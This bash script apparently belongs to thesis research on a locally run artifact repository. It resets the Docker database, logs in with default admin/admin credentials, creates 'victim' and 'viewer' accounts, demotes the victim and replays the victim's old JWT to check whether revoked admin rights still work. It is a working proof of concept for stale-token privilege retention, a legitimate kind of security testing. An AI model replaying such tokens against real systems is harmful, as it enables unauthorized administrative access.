#!/bin/bash
cd /Users/minhnguyen/IdeaProjects/graduational-thesis/infra/artifact-keeper-target/src
CF="-f docker-compose.local-dev.yml -f docker-compose.thesis.yml"
API=http://localhost:8080/api/v1
PW='Thesis-Pass-1234'

echo "=== reset DB (fresh admin/admin) ==="
docker compose $CF stop backend postgres >/dev/null 2>&1
docker compose $CF rm -f backend postgres >/dev/null 2>&1
docker volume rm src_dev_postgres_data >/dev/null 2>&1
docker compose $CF up -d postgres >/dev/null 2>&1
for i in $(seq 1 30); do [ "$(docker inspect -f '{{.State.Health.Status}}' artifact-keeper-dev-db 2>/dev/null)" = healthy ] && break; sleep 2; done
docker compose $CF up -d backend >/dev/null 2>&1
for i in $(seq 1 120); do [ "$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/health 2>/dev/null)" = 200 ] && { echo "backend up ~$((i*3))s"; break; }; sleep 3; done

tok(){ python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null; }
field(){ python3 -c "import sys,json;print(json.load(sys.stdin).get('$1',''))" 2>/dev/null; }
claim(){ python3 -c "import sys,base64,json;t='$1'.split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t)).get('$2'))" 2>/dev/null; }
POST(){ curl -s -X POST "$1" -H 'Content-Type: application/json' ${3:+-H "Authorization: Bearer $3"} -d "$2"; }
code(){ curl -s -o /dev/null -w '%{http_code}' -X "$1" "$2" -H 'Content-Type: application/json' ${4:+-H "Authorization: Bearer $4"} ${3:+-d "$3"}; }

echo "===== BOOTSTRAP ====="
A1=$(POST "$API/auth/login" "$(printf '{"username":"admin","password":"admin"}')" | tok)
echo "admin(default) token len ${#A1}"
AID=$(claim "$A1" sub); echo "admin id $AID"
CH=$(code POST "$API/users/$AID/password" "$(printf '{"current_password":"admin","new_password":"%s"}' "$PW")" "$A1")
echo "change admin pw -> $CH"
sleep 2
A=$(POST "$API/auth/login" "$(printf '{"username":"admin","password":"%s"}' "$PW")" | tok)
echo "admin re-login token len ${#A} is_admin=$(claim "$A" is_admin)"
VBODY=$(printf '{"username":"victim","email":"victim@probe.test","password":"%s","is_admin":true}' "$PW")
VC=$(POST "$API/users" "$VBODY" "$A"); VID=$(echo "$VC" | python3 -c "import sys,json;d=json.load(sys.stdin);u=d.get('user',d);print(u.get('id',''))" 2>/dev/null)
echo "victim id=$VID  (raw ${VC:0:90})"
VWC=$(code POST "$API/users" "$(printf '{"username":"viewer","email":"viewer@probe.test","password":"%s","is_admin":false}' "$PW")" "$A")
echo "viewer create -> $VWC"

ucode(){ local n="probe$RANDOM$RANDOM"; code POST "$API/users" "$(printf '{"username":"%s","email":"%s@probe.test","password":"%s","is_admin":false}' "$n" "$n" "$PW")" "$1"; }

echo; echo "===== MR-A1 ====="
VOLD=$(POST "$API/auth/login" "$(printf '{"username":"victim","password":"%s"}' "$PW")" | tok)
echo "[A] V_OLD is_admin claim=$(claim "$VOLD" is_admin)  token len ${#VOLD}"
echo "[B] source victim(admin) create w/ V_OLD (expect 2xx) -> $(ucode "$VOLD")"
VW=$(POST "$API/auth/login" "$(printf '{"username":"viewer","password":"%s"}' "$PW")" | tok)
echo "[C] viewer create (expect 403) -> $(ucode "$VW")"
DC=$(code PATCH "$API/users/$VID" "$(printf '{"is_admin":false}')" "$A")
echo "[D] transition admin PATCH /users/$VID is_admin=false (expect 2xx) -> $DC"
VNEW=$(POST "$API/auth/login" "$(printf '{"username":"victim","password":"%s"}' "$PW")" | tok)
echo "[E] fresh victim is_admin=$(claim "$VNEW" is_admin) ; fresh create (expect 403) -> $(ucode "$VNEW")"
echo "[F] *** REPLAY V_OLD create AFTER demotion (VULN expects 2xx) -> $(ucode "$VOLD") ***"
echo "[poll] V_OLD stays 2xx? (claim-based, not cache):"
for i in 1 2 3 4; do o=$(ucode "$VOLD"); f=$(ucode "$VNEW"); echo "   +$((i*8))s old=$o fresh=$f"; sleep 8; done
echo "[DONE]"
